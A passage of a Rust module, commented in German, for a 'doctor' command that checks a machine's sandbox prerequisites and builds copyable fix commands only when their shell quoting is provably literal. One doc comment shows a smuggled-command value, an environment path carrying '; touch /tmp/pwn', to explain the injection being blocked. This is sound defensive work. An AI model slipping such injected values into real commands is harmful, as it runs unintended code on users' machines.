//! `humanitl doctor`: die Maschine prüfen, bevor etwas startet (HUM-075).
//!
//! Humanitl läuft auf fremden Rechnern. Die Sandbox braucht `bwrap` und
//! unprivilegierte Nutzer-Namensräume, der Shim braucht seccomp, der Daemon
//! braucht ein Laufzeitverzeichnis, und die Oberfläche braucht einen Platz für
//! ihr Anzeigesymbol. Fehlt eines davon, soll ein Mensch in einer Zeile lesen,
//! was fehlt und was er dagegen tun kann — nicht in einem Stapeltrace nach dem
//! ersten Start.
//!
//! # Drei Zustände, und keiner davon heißt „nachgesehen habe ich nicht"
//!
//! Jede Zeile trägt [`CheckStatus::Ok`], [`CheckStatus::Warn`] oder
//! [`CheckStatus::Fail`]. Eine Prüfung, die nicht durchgeführt werden konnte,
//! ist **nie** `ok`: Sie wird zu [`CheckOutcome::unmeasured`], also einer
//! Warnung mit `DOCTOR_012`, deren `why` den Grund nennt und deren `fix` den
//! Befehl trägt, den der Doctor versucht hat. Ein Doctor, der `ok` meldet,
//! weil er nicht hinsehen konnte, ist schlechter als keiner: Er behauptet
//! etwas über eine Maschine, die er nicht gelesen hat
//! (`backlog/CONVENTIONS.md` 4.13).
//!
//! # Tatsachen und Urteil sind getrennt
//!
//! [`Probe`] liest die Maschine und füllt [`MachineFacts`]; [`run`] urteilt
//! über die Tatsachen und sonst nichts. Beides steht mit Absicht auseinander:
//!
//! - Jede Prüfung ist testbar, ohne dass der Rechner in dem Zustand ist, den
//!   sie prüft. Ein Test baut die Tatsachen und ruft [`run`].
//! - Was gemessen wurde, steht als Wert da und nicht als Nebenwirkung. Ein
//!   fehlender Kernel-Schalter ist [`Reading::Absent`], ein vorhandener mit
//!   unbrauchbarem Wert ist [`Reading::Found`] mit diesem Wert; die Befunde
//!   sagen, welches von beidem gefunden wurde.
//!
//! # Was der Doctor nicht tut
//!
//! - **Er fasst das Netz nicht an.** Keine einzige Prüfung baut eine
//!   Verbindung auf. Die Erreichbarkeit des Sprachmodells ist die einzige
//!   Frage, für die das nötig wäre, und sie wird hier nur *beurteilt*, nie
//!   *gemessen*: Der Aufrufer misst sie über die RPC `ProbeLlm` (HUM-039) und
//!   reicht das Ergebnis als [`LlmFacts`] herein. Ohne Messung steht in der
//!   Zeile `DOCTOR_013` — „es wurde nichts kontaktiert" — samt dem Befehl, der
//!   es täte. Damit gibt es keinen Weg, auf dem das Öffnen eines Bildschirms
//!   still eine Verbindung nach draußen erzeugt (HUM-076 hält dieselbe Regel).
//! - **Er repariert nichts.** Jeder Befund trägt einen Vorschlag; ausgeführt
//!   wird er von einem Menschen.
//! - **Er startet keine Sandbox.** Die drei Garantien misst
//!   [`SandboxBackend::isolation_check`](crate::SandboxBackend::isolation_check)
//!   an einer laufenden Sandbox; der Doctor prüft die Vorbedingungen dafür.
//!
//! # Fremde Rechner
//!
//! Kein Pfad dieses Moduls stammt aus der Maschine, auf der es geschrieben
//! wurde. Was aus der Umgebung kommt (`PATH`, `XDG_RUNTIME_DIR`,
//! `XDG_DATA_HOME`), kommt aus [`humanitl_config::Env`]; was das Modul selbst
//! benennt (`/proc/self/status`, `/etc/ld.so.conf.d`), liegt unter der Wurzel
//! von [`Probe`] und ist damit im Test ein Verzeichnis wie jedes andere.

mod checks;
mod probe;

use std::path::PathBuf;
use std::time::Duration;

use humanitl_core::diagnostics::codes::{DOCTOR_012, DOCTOR_013};
use humanitl_core::{Diagnostic, FixAction, Severity, sanitize_note};

use crate::bwrap::Version;

pub use self::probe::{DEFAULT_TIMEOUT, MIN_FREE_BYTES, Probe};

/// Der feste Anfang jedes Belegs einer Prüfung, die nicht laufen konnte.
///
/// Steht am Anfang von [`CheckOutcome::evidence`], damit eine Zeile ohne
/// Messung auch in einer Tabelle ohne Befund als solche zu erkennen ist.
pub const NOT_MEASURED: &str = "not measured";

/// Wo die Codes dieses Moduls erklärt sind.
///
/// Der Vorschlag einer Zeile, deren Befehl sich nicht beweisbar zitieren
/// lässt: Lesen ist dann das Einzige, was ehrlich angeboten werden kann.
pub const DIAGNOSTICS_URL: &str = concat!(
    env!("CARGO_PKG_REPOSITORY"),
    "/blob/main/docs/DIAGNOSTICS.md"
);

/// Ein Befehl, den ein Mensch kopieren und ausführen darf — oder keiner.
///
/// # Warum diese Funktion überhaupt da ist
///
/// Ein Wert, der von außen kommt, wird nie durch Interpolation zu einem
/// Befehl. `XDG_RUNTIME_DIR='/tmp/h; touch /tmp/pwn'` ergibt sonst den
/// Vorschlag `chmod 700 /tmp/h; touch /tmp/pwn`, und ein Mensch fügt ihn in
/// seine Shell ein. Das ist im Projekt der dritte Fall desselben Fehlers:
/// HUM-043 baute ein `rm` aus einem Pfad, den der Agent benannt hatte, HUM-106
/// ein `export KEY=VALUE` für die Zwischenablage, und hier wäre es ein
/// `chmod`. `crate::summary::copy_command` und `app/lib/core/ui/shell_command.dart`
/// halten dieselbe Regel für ihren Fall; diese Funktion ist sie für beliebig
/// viele Wörter.
///
/// # Die Regel
///
/// Ein Befehl entsteht nur, wenn jedes Wort alles vier erfüllt:
///
/// 1. Es ist nicht leer.
/// 2. [`sanitize_note`] ändert es nicht. Das schützt nicht die Shell, sondern
///    das Auge: Steuerzeichen, Zeilenumbrüche, unsichtbare Zeichen,
///    Bidi-Umkehrungen und Überlänge sind damit ausgeschlossen, und was im
///    Befund steht, ist auch das, was der Mensch einfügt.
/// 3. **Die Zitierung ist wörtlich.** Angenommen wird nur, was
///    `shlex::try_quote` unverändert lässt oder in genau ein Paar einfacher
///    Anführungszeichen ohne ein weiteres `'` im Inneren setzt. Beides ist in
///    jeder POSIX-Shell wörtlich: Zwischen einfachen Anführungszeichen hat
///    kein Zeichen eine Sonderbedeutung, auch `$(`, `` ` ``, `;`, `|`, `*`,
///    `"` und `\` nicht.
///
///    Alles andere wird abgelehnt, statt es nachzuprüfen — und das ist bei
///    `shlex` 2 mehr, als es klingt: Für ein Wort mit `'` oder `\` liefert
///    `try_quote` **doppelte** Anführungszeichen (`"/w/it's"`,
///    `"/w/a\\b"`). In doppelten Anführungszeichen behalten `$`, `` ` ``, `\`
///    und `"` ihre Bedeutung, und ob eine bestimmte Shell dieselbe Auslegung
///    hat wie der Leser von `shlex`, ist genau die Frage, die hier niemand
///    beantworten will. Solche Wörter ergeben deshalb keinen Befehl.
/// 4. `shlex::split` der fertigen Zeile ergibt wieder genau diese Wörter, in
///    dieser Reihenfolge.
///
/// Sonst `None`: Dann gibt es keinen Befehl, sondern einen Satz, der sagt
/// warum.
///
/// Schritt 4 ist heute unerreichbar: Was Schritt 3 übrig lässt, ist entweder
/// unverändert oder einfach zitiert, und beides zerlegt `shlex::split` wieder
/// zu demselben Wort. Er bleibt trotzdem stehen, weil er die Zusage ist und
/// nicht ihre Folge — änderte `shlex` seine Zitierung, hinge alles daran. Der
/// Mutationstest dazu überlebt deshalb, und das ist der Grund.
#[must_use]
pub fn shell_command(words: &[&str]) -> Option<String> {
    if words.is_empty() {
        return None;
    }
    let mut quoted = Vec::with_capacity(words.len());
    for word in words {
        if word.is_empty() || *word != sanitize_note(word) {
            return None;
        }
        let piece = shlex::try_quote(word).ok()?;
        if !is_literal_word(&piece, word) {
            return None;
        }
        quoted.push(piece.into_owned());
    }
    let line = quoted.join(" ");
    let back = shlex::split(&line)?;
    if back.len() != words.len() || back.iter().zip(words).any(|(got, want)| got != want) {
        return None;
    }
    Some(line)
}

/// Ob `quoted` ein wörtliches Wort für `word` ist: unverändert oder genau ein
/// Paar einfacher Anführungszeichen ohne ein weiteres `'` im Inneren.
fn is_literal_word(quoted: &str, word: &str) -> bool {
    if quoted == word {
        return true;
    }
    let Some(inner) = quoted.strip_prefix('\'').and_then(|q| q.strip_suffix('\'')) else {
        return false;
    };
    !inner.contains('\'') && inner == word
}

/// Der Vorschlag zu einem Befehl, den der Doctor versucht hat.
///
/// Lässt sich der Befehl nicht beweisbar zitieren, verweist der Vorschlag auf
/// die Erklärung statt auf eine Zeile, die etwas anderes täte, als sie zeigt.
#[must_use]
pub fn command_fix(words: &[&str]) -> FixAction {
    shell_command(words).map_or_else(
        || FixAction::OpenUrl(DIAGNOSTICS_URL.to_owned()),
        FixAction::CopyCommand,
    )
}

/// Die Prüfungen, in der Reihenfolge der Ausgabe.
///
/// Die Kurznamen sind Teil des Vertrags: Sie stehen als `DoctorCheck.id` in
/// der Proto, und die Oberfläche schaltet danach.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum CheckId {
    /// Ist `bwrap` da, und ist es neu genug?
    Bwrap,
    /// Darf dieser Nutzer einen Namensraum aufmachen?
    Userns,
    /// Kennt der Kernel seccomp?
    Seccomp,
    /// Gibt es ein privates Laufzeitverzeichnis?
    RuntimeDir,
    /// Läuft eine systemd-Nutzersitzung?
    SystemdUser,
    /// Antwortet der Daemon, und spricht er denselben Vertrag?
    Daemon,
    /// Ist das Kommando des Agenten auf dem Host zu finden?
    Agent,
    /// Antwortet das Sprachmodell? Nur, wenn jemand danach gefragt hat.
    Llm,
    /// Hat die Arbeitsumgebung einen Platz für das Anzeigesymbol?
    Tray,
    /// Verträgt sich der Renderer der Oberfläche mit dieser Grafik?
    Renderer,
    /// Ist im Datenverzeichnis genug Platz für die Aufzeichnung?
    DiskSpace,
}

impl CheckId {
    /// Alle Prüfungen, in der Reihenfolge, in der sie ausgegeben werden.
    pub const ALL: [Self; 11] = [
        Self::Bwrap,
        Self::Userns,
        Self::Seccomp,
        Self::RuntimeDir,
        Self::SystemdUser,
        Self::Daemon,
        Self::Agent,
        Self::Llm,
        Self::Tray,
        Self::Renderer,
        Self::DiskSpace,
    ];

    /// Der Kurzname in `snake_case`, wie ihn Protokoll und Oberfläche führen.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Bwrap => "bwrap",
            Self::Userns => "userns",
            Self::Seccomp => "seccomp",
            Self::RuntimeDir => "runtime_dir",
            Self::SystemdUser => "systemd_user",
            Self::Daemon => "daemon",
            Self::Agent => "agent",
            Self::Llm => "llm",
            Self::Tray => "tray",
            Self::Renderer => "renderer",
            Self::DiskSpace => "disk_space",
        }
    }
}

impl std::fmt::Display for CheckId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Wie eine Prüfung ausgegangen ist.
///
/// Die Reihenfolge der Varianten ist die Rangfolge: [`CheckStatus::Fail`] ist
/// das Schlimmste, und [`DoctorReport::worst`] nimmt das Maximum.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum CheckStatus {
    /// Gemessen und in Ordnung.
    Ok,
    /// Es läuft, aber nicht so, wie es soll — oder es wurde nicht gemessen.
    Warn,
    /// Ohne das hier startet keine Sandbox.
    Fail,
}

impl CheckStatus {
    /// Der Kurzname in Kleinbuchstaben: `ok`, `warn`, `fail`.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Ok => "ok",
            Self::Warn => "warn",
            Self::Fail => "fail",
        }
    }
}

impl std::fmt::Display for CheckStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Eine Zeile der Doctor-Ausgabe.
///
/// Gebaut wird sie nur über die vier Konstruktoren; das hält die Zusage, dass
/// jede nicht-grüne Zeile einen Befund trägt, an einer Stelle fest, statt sie
/// in elf Prüfungen zu wiederholen.
#[derive(Debug, Clone, PartialEq)]
pub struct CheckOutcome {
    /// Welche Prüfung.
    id: CheckId,
    /// Wie sie ausging.
    status: CheckStatus,
    /// Was gemessen wurde, in einer Zeile, zum Beispiel `bubblewrap 0.11.0`.
    evidence: String,
    /// Der Befund, wenn der Status nicht `ok` ist. Bei `ok` immer `None`.
    diagnostic: Option<Diagnostic>,
}

impl CheckOutcome {
    /// Gemessen und in Ordnung.
    #[must_use]
    pub fn ok(id: CheckId, evidence: impl Into<String>) -> Self {
        Self {
            id,
            status: CheckStatus::Ok,
            evidence: evidence.into(),
            diagnostic: None,
        }
    }

    /// Gemessen, und das Ergebnis taugt nicht ganz.
    #[must_use]
    pub fn warn(id: CheckId, evidence: impl Into<String>, diagnostic: Diagnostic) -> Self {
        Self {
            id,
            status: CheckStatus::Warn,
            evidence: evidence.into(),
            diagnostic: Some(diagnostic),
        }
    }

    /// Gemessen, und ohne eine Änderung startet nichts.
    #[must_use]
    pub fn fail(id: CheckId, evidence: impl Into<String>, diagnostic: Diagnostic) -> Self {
        Self {
            id,
            status: CheckStatus::Fail,
            evidence: evidence.into(),
            diagnostic: Some(diagnostic),
        }
    }

    /// Die Prüfung konnte nicht durchgeführt werden.
    ///
    /// `why` sagt, woran es lag; `words` ist der Befehl, den der Doctor
    /// versucht hat, ein Wort je Eintrag. Damit trägt auch diese Zeile einen
    /// brauchbaren Vorschlag, obwohl es nichts zu reparieren gibt: Wer
    /// nachsehen will, bekommt den Weg dorthin.
    ///
    /// Der Befehl geht durch [`shell_command`] und entsteht nur, wenn er
    /// beweisbar genau die Wörter ist, die er zeigt; sonst verweist der
    /// Vorschlag auf die Erklärung des Codes.
    ///
    /// Der Status ist [`CheckStatus::Warn`] und nie [`CheckStatus::Ok`].
    #[must_use]
    pub fn unmeasured(id: CheckId, why: impl AsRef<str>, words: &[&str]) -> Self {
        let why = why.as_ref();
        Self::warn(
            id,
            format!("{NOT_MEASURED}: {why}"),
            Diagnostic::builder(DOCTOR_012, Severity::Warning)
                .why(format!("the check {id} could not be performed: {why}"))
                .fix(command_fix(words))
                .build(),
        )
    }

    /// Welche Prüfung.
    #[must_use]
    pub const fn id(&self) -> CheckId {
        self.id
    }

    /// Wie sie ausging.
    #[must_use]
    pub const fn status(&self) -> CheckStatus {
        self.status
    }

    /// Was gemessen wurde.
    #[must_use]
    pub fn evidence(&self) -> &str {
        &self.evidence
    }

    /// Der Befund, wenn der Status nicht `ok` ist.
    #[must_use]
    pub const fn diagnostic(&self) -> Option<&Diagnostic> {
        self.diagnostic.as_ref()
    }

    /// Wahr, wenn diese Zeile gar keine Messung ist.
    #[must_use]
    pub fn is_unmeasured(&self) -> bool {
        self.evidence.starts_with(NOT_MEASURED)
    }
}

/// Die vollständige Ausgabe, in Anzeigereihenfolge.
#[derive(Debug, Clone, PartialEq)]
pub struct DoctorReport {
    /// Eine Zeile je Prüfung aus [`CheckId::ALL`], in dieser Reihenfolge.
    pub checks: Vec<CheckOutcome>,
}

impl DoctorReport {
    /// Der schlimmste Status im Bericht; `ok` bei leerem Bericht.
    #[must_use]
    pub fn worst(&self) -> CheckStatus {
        self.checks
            .iter()
            .map(CheckOutcome::status)
            .max()
            .unwrap_or(CheckStatus::Ok)
    }

    /// Wahr, wenn mindestens eine Prüfung fehlgeschlagen ist.
    ///
    /// Das ist die Frage, die über den Exit-Code der Kommandozeile und über
    /// den Start-Knopf des Setup-Bildschirms entscheidet.
    #[must_use]
    pub fn has_failure(&self) -> bool {
        self.worst() == CheckStatus::Fail
    }

    /// Die Zeile einer Prüfung.
    #[must_use]
    pub fn get(&self, id: CheckId) -> Option<&CheckOutcome> {
        self.checks.iter().find(|check| check.id() == id)
    }
}

/// Was beim Lesen einer einzelnen Quelle herauskam.
///
/// Der Unterschied zwischen „gibt es hier nicht" und „gibt es, taugt aber
/// nicht" ist der Unterschied zwischen zwei Maschinen, und die Befunde sagen
/// ihn: Ein Kernel ohne
/// `/proc/sys/kernel/apparmor_restrict_unprivileged_userns` ist ein anderer
/// Fall als einer, der dort `1` stehen hat.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reading<T> {
    /// Gelesen.
    Found(T),
    /// Die Quelle gibt es auf diesem Rechner nicht.
    Absent,
    /// Die Quelle ist da, ließ sich aber nicht lesen; der Text ist der Fehler.
    Unreadable(String),
}

impl<T> Reading<T> {
    /// Der Wert, wenn er gelesen wurde.
    #[must_use]
    pub const fn found(&self) -> Option<&T> {
        match self {
            Self::Found(value) => Some(value),
            Self::Absent | Self::Unreadable(_) => None,
        }
    }

    /// Warum nichts gelesen wurde, als Prädikat ohne Subjekt; `None` nach
    /// einer gelungenen Lesung.
    ///
    /// Ohne Subjekt, damit der Aufrufer es setzt: `format!("{path} {phrase}")`
    /// ergibt „`/proc/modules` does not exist on this machine". Ein
    /// mitgeliefertes „it" ergäbe an derselben Stelle „`/proc/modules` it does
    /// not exist" — genau so stand es am 2026-09-05 in der Ausgabe.
    #[must_use]
    pub fn missing_because(&self) -> Option<String> {
        match self {
            Self::Found(_) => None,
            Self::Absent => Some("does not exist on this machine".to_owned()),
            Self::Unreadable(error) => Some(format!("could not be read: {error}")),
        }
    }
}

/// Wie ein Aufruf ausgegangen ist.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RunOutcome {
    /// Das Programm hat sich selbst beendet.
    Exited(i32),
    /// Ein Signal hat es beendet.
    Signalled(i32),
    /// Es lief noch, als die Frist ablief, und wurde beendet.
    TimedOut(Duration),
}

impl RunOutcome {
    /// Wahr, wenn das Programm mit 0 endete.
    #[must_use]
    pub const fn is_success(self) -> bool {
        matches!(self, Self::Exited(0))
    }

    /// Wie das Ende in einem Beleg dasteht.
    #[must_use]
    pub fn describe(self) -> String {
        match self {
            Self::Exited(0) => "exit 0".to_owned(),
            Self::Exited(code) => format!("exit {code}"),
            Self::Signalled(signal) => format!("killed by signal {signal}"),
            Self::TimedOut(after) => format!("no answer within {} ms", after.as_millis()),
        }
    }
}

/// Ein Aufruf und was er hinterlassen hat.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandRun {
    /// Programm und Argumente, ein Wort je Eintrag.
    ///
    /// Wörter und nicht eine fertige Zeile: Aus Wörtern lässt sich ein Befehl
    /// bauen, der beweisbar dieselben Wörter bleibt ([`shell_command`]); aus
    /// einer Zeile, in der schon jemand einen Pfad hineininterpoliert hat,
    /// nicht mehr.
    pub words: Vec<String>,
    /// Wie der Aufruf endete.
    pub outcome: RunOutcome,
    /// Die Standardausgabe, ohne Leerraum an den Rändern.
    pub stdout: String,
    /// Die Fehlerausgabe, ohne Leerraum an den Rändern.
    pub stderr: String,
}

impl CommandRun {
    /// Ein Aufruf aus Programm und Argumenten.
    #[must_use]
    pub fn new(
        words: impl IntoIterator<Item = String>,
        outcome: RunOutcome,
        stdout: impl Into<String>,
        stderr: impl Into<String>,
    ) -> Self {
        Self {
            words: words.into_iter().collect(),
            outcome,
            stdout: stdout.into(),
            stderr: stderr.into(),
        }
    }

    /// Das Programm, ohne seine Argumente.
    ///
    /// Für Belege, die in eine Tabellenspalte passen sollen: Die
    /// Namensraum-Probe trägt zwanzig Argumente, und die ganze Zeile in einer
    /// Spalte schöbe jede andere aus dem Bild. Der vollständige Aufruf steht
    /// im Befund, wo man ihn kopieren kann.
    #[must_use]
    pub fn program(&self) -> &str {
        self.words.first().map_or("", String::as_str)
    }

    /// Die Wörter als Scheiben, für [`shell_command`] und [`command_fix`].
    #[must_use]
    pub fn parts(&self) -> Vec<&str> {
        self.words.iter().map(String::as_str).collect()
    }

    /// Der Aufruf als Zeile, zum Anzeigen.
    ///
    /// Die zitierte Form, wo sie beweisbar dieselben Wörter ergibt, sonst die
    /// Wörter mit Leerzeichen dazwischen — **nur** zum Lesen. Kopierbar wird
    /// eine Zeile allein über [`CommandRun::fix`].
    #[must_use]
    pub fn line(&self) -> String {
        shell_command(&self.parts()).unwrap_or_else(|| self.words.join(" "))
    }

    /// Der Vorschlag, diesen Aufruf von Hand nachzufahren.
    #[must_use]
    pub fn fix(&self) -> FixAction {
        command_fix(&self.parts())
    }

    /// Die erste nicht leere Zeile der Fehlerausgabe, sonst der Ausgabe,
    /// sonst ein Strich. Für den Grund eines Befunds.
    #[must_use]
    pub fn first_message(&self) -> String {
        [self.stderr.as_str(), self.stdout.as_str()]
            .into_iter()
            .flat_map(str::lines)
            .map(str::trim)
            .find(|line| !line.is_empty())
            .unwrap_or("-")
            .to_owned()
    }
}

/// Was über `bwrap` bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BwrapFacts {
    /// In keinem Verzeichnis aus `PATH` liegt ein ausführbares `bwrap`.
    Missing {
        /// Der `PATH`, in dem gesucht wurde.
        searched: String,
    },
    /// Gefunden, und `--version` hat eine Fassung genannt.
    Found {
        /// Wo es liegt.
        program: PathBuf,
        /// Was es meldet.
        version: Version,
    },
    /// Gefunden, aber `--version` lief nicht oder nannte keine Zahl.
    Unreadable {
        /// Wo es liegt.
        program: PathBuf,
        /// Woran es lag.
        error: String,
    },
}

/// Was über die Nutzer-Namensräume bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UsernsFacts {
    /// `bwrap --unshare-user … /bin/true`, der Versuch, der zählt.
    ///
    /// [`Reading::Absent`], wenn es kein `bwrap` gibt: Dann ist nichts
    /// probiert worden, und die Zeile sagt genau das.
    pub probe: Reading<CommandRun>,
    /// `/proc/sys/kernel/apparmor_restrict_unprivileged_userns`, roh.
    pub apparmor_restrict: Reading<String>,
    /// `/proc/sys/kernel/unprivileged_userns_clone`, roh.
    pub userns_clone: Reading<String>,
}

/// Die Zeile `Seccomp:` aus `/proc/self/status`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SeccompLine {
    /// Die Zeile steht da; der Text ist ihr Wert.
    Present(String),
    /// Die Datei ist lesbar, führt die Zeile aber nicht: Der Kernel ist ohne
    /// `CONFIG_SECCOMP` gebaut.
    Missing,
}

/// Was über seccomp bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SeccompFacts {
    /// Was `/proc/self/status` über seccomp sagt.
    pub line: Reading<SeccompLine>,
    /// `/proc/sys/kernel/osrelease`, roh.
    pub kernel_release: Reading<String>,
}

/// Was über `$XDG_RUNTIME_DIR` bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuntimeDirFacts {
    /// `$XDG_RUNTIME_DIR` ist nicht gesetzt oder leer.
    Unset {
        /// Wo eine systemd-Sitzung es hinlegen würde.
        expected: PathBuf,
    },
    /// Gesetzt, aber den Pfad gibt es nicht.
    Missing {
        /// Der Pfad aus der Umgebung.
        path: PathBuf,
    },
    /// Gesetzt und da.
    Present {
        /// Der Pfad aus der Umgebung.
        path: PathBuf,
        /// Die unteren neun Bits der Rechte.
        mode: u32,
        /// Wem es gehört.
        owner_uid: u32,
        /// Wer wir sind.
        our_uid: u32,
        /// Ob es überhaupt ein Verzeichnis ist.
        is_dir: bool,
    },
    /// Gesetzt, aber die Rechte ließen sich nicht lesen.
    Unreadable {
        /// Der Pfad aus der Umgebung.
        path: PathBuf,
        /// Woran es lag.
        error: String,
    },
}

/// Was über die systemd-Nutzersitzung bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SystemdFacts {
    /// `systemctl --user is-system-running`.
    ///
    /// [`Reading::Absent`], wenn es kein `systemctl` in `PATH` gibt; das ist
    /// auf einem System ohne systemd der Normalfall und kein Fehler.
    pub state: Reading<CommandRun>,
    /// Der `PATH`, in dem nach `systemctl` gesucht wurde.
    pub searched: String,
}

/// Was über den Daemon bekannt ist.
///
/// Diese Tatsachen misst der Doctor nicht selbst: Wer ihn ruft, hat entweder
/// gerade mit dem Daemon gesprochen oder es vergeblich versucht.
#[derive(Debug, Clone, PartialEq)]
pub enum DaemonFacts {
    /// Der Aufrufer hat den Daemon erreicht.
    Reachable {
        /// Wo sein Socket liegt.
        socket: PathBuf,
        /// Seine Fassung.
        version: String,
        /// Die Vertragsversion, die er spricht.
        proto: (u32, u32),
        /// Die Vertragsversion, die der Aufrufer spricht.
        expected_proto: (u32, u32),
    },
    /// Der Aufrufer hat es versucht und ihn nicht erreicht.
    Unreachable {
        /// Wo sein Socket liegen müsste.
        socket: PathBuf,
        /// Warum es nicht ging.
        diagnostic: Box<Diagnostic>,
    },
    /// Es hat niemand versucht.
    NotTried {
        /// Wo sein Socket liegen müsste.
        socket: PathBuf,
        /// Warum nicht.
        why: String,
    },
}

/// Was über das Kommando des Agenten bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AgentFacts {
    /// Kein ausführbares Kommando dieses Namens in `PATH`.
    Missing {
        /// Der Name des Adapters, zum Beispiel `opencode`.
        adapter: String,
        /// Das gesuchte Kommando.
        command: String,
        /// Der `PATH`, in dem gesucht wurde.
        searched: String,
        /// Wie man es nachinstalliert.
        install: String,
    },
    /// Gefunden.
    Found {
        /// Der Name des Adapters.
        adapter: String,
        /// Das gesuchte Kommando.
        command: String,
        /// Wo es liegt.
        program: PathBuf,
        /// Was `--version` gesagt hat.
        version: Reading<String>,
    },
}

/// Was über das Sprachmodell bekannt ist.
///
/// Gemessen wird hier nichts; siehe die Modulbeschreibung.
#[derive(Debug, Clone, PartialEq)]
pub enum LlmFacts {
    /// `llm.endpoint` ist nicht gesetzt.
    NoEndpoint,
    /// Gesetzt, und niemand hat den Endpunkt angesprochen.
    NotContacted {
        /// Die Adresse, wie sie in der Konfiguration steht.
        endpoint: String,
        /// Der Befehl, der die Probe auslöst.
        command: String,
    },
    /// Der Endpunkt hat geantwortet.
    Answered {
        /// Die Adresse, die gefragt wurde.
        endpoint: String,
        /// Was geantwortet hat, zum Beispiel `ollama`.
        flavor: String,
        /// Wie viele Modelle es nennt.
        models: usize,
        /// Wie lange die Probe gebraucht hat.
        latency_ms: u32,
        /// Was die Probe daneben gefunden hat, zum Beispiel `LLM_006`.
        diagnostics: Vec<Diagnostic>,
    },
    /// Der Endpunkt hat nicht geantwortet.
    Silent {
        /// Die Adresse, die gefragt wurde.
        endpoint: String,
        /// Warum nichts kam.
        diagnostic: Box<Diagnostic>,
    },
}

/// Der Befehl, der die Erreichbarkeit des Sprachmodells wirklich misst.
///
/// Er steht als Vorschlag in der Zeile `llm`, solange niemand darum gebeten
/// hat. Unter ihm läuft die RPC `ProbeLlm` (HUM-039); die Kommandozeile ist
/// ihr Client. Der Text steht hier und nicht in Daemon und Kommandozeile
/// getrennt, damit beide Seiten denselben Befehl vorschlagen.
pub const PROBE_LLM_COMMAND: &str = "humanitl doctor --probe-llm";

impl LlmFacts {
    /// Die Tatsachen ohne jede Messung.
    ///
    /// Ein Endpunkt, den es nicht gibt, ist [`LlmFacts::NoEndpoint`]; einen,
    /// den es gibt, hat der Doctor von sich aus nicht angesprochen. Beide
    /// Seiten — der Daemon in `Doctor` und die Kommandozeile ohne
    /// `--probe-llm` — bauen ihn hier, damit die Zeile nicht an zwei Stellen
    /// entsteht und auseinanderlaufen kann.
    #[must_use]
    pub fn not_contacted(endpoint: Option<String>, command: impl Into<String>) -> Self {
        endpoint.map_or(Self::NoEndpoint, |endpoint| Self::NotContacted {
            endpoint,
            command: command.into(),
        })
    }
}

/// Was über den Platz für das Anzeigesymbol bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TrayFacts {
    /// Die Bibliothek, wenn eine gefunden wurde.
    pub library: Option<PathBuf>,
    /// Wie viele Verzeichnisse überhaupt gelesen werden konnten.
    ///
    /// Null heißt: Es wurde nirgends nachgesehen, und das Fehlen beweist
    /// nichts.
    pub readable_dirs: usize,
    /// Wie viele Verzeichnisse durchsucht wurden.
    pub searched_dirs: usize,
    /// `$XDG_CURRENT_DESKTOP`, wie es dasteht; `None`, wenn nicht gesetzt.
    pub desktop: Option<String>,
}

/// Was über Grafik und Renderer bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RendererFacts {
    /// `$XDG_SESSION_TYPE`, zum Beispiel `wayland`.
    pub session_type: Option<String>,
    /// Ob ein NVIDIA-Treiber geladen ist.
    pub nvidia: Reading<bool>,
    /// `$FLUTTER_ENGINE`, falls jemand die Engine von Hand gesetzt hat.
    pub flutter_engine: Option<String>,
}

/// Was über den freien Platz bekannt ist.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DiskFacts {
    /// Gemessen.
    Measured {
        /// Das Verzeichnis, dessen Dateisystem gemessen wurde.
        path: PathBuf,
        /// Wie viele Bytes noch frei sind.
        available_bytes: u64,
    },
    /// Nicht gemessen.
    Unreadable {
        /// Das Verzeichnis, das gemeint war.
        path: PathBuf,
        /// Woran es lag.
        error: String,
    },
}

/// Alles, was der Doctor über die Maschine gelesen hat.
///
/// Ein Test baut den Wert von Hand und ruft [`run`]; auf einem Rechner füllt
/// ihn [`Probe::collect`].
#[derive(Debug, Clone, PartialEq)]
pub struct MachineFacts {
    /// `bwrap` und seine Fassung.
    pub bwrap: BwrapFacts,
    /// Nutzer-Namensräume.
    pub userns: UsernsFacts,
    /// seccomp und der Kernel.
    pub seccomp: SeccompFacts,
    /// Das Laufzeitverzeichnis.
    pub runtime_dir: RuntimeDirFacts,
    /// Die systemd-Nutzersitzung.
    pub systemd_user: SystemdFacts,
    /// Der Daemon; kommt vom Aufrufer.
    pub daemon: DaemonFacts,
    /// Das Kommando des Agenten.
    pub agent: AgentFacts,
    /// Das Sprachmodell; kommt vom Aufrufer.
    pub llm: LlmFacts,
    /// Der Platz für das Anzeigesymbol.
    pub tray: TrayFacts,
    /// Grafik und Renderer.
    pub renderer: RendererFacts,
    /// Der freie Platz im Datenverzeichnis.
    pub disk: DiskFacts,
}

/// Urteilt über die Tatsachen; eine Zeile je [`CheckId::ALL`].
///
/// Reine Funktion: Sie liest keine Datei, startet kein Programm und fasst das
/// Netz nicht an. Alles, worüber sie urteilt, steht in `facts`.
#[must_use]
pub fn run(facts: &MachineFacts) -> DoctorReport {
    DoctorReport {
        checks: vec![
            checks::bwrap(&facts.bwrap),
            checks::userns(&facts.userns),
            checks::seccomp(&facts.seccomp),
            checks::runtime_dir(&facts.runtime_dir),
            checks::systemd_user(&facts.systemd_user),
            checks::daemon(&facts.daemon),
            checks::agent(&facts.agent),
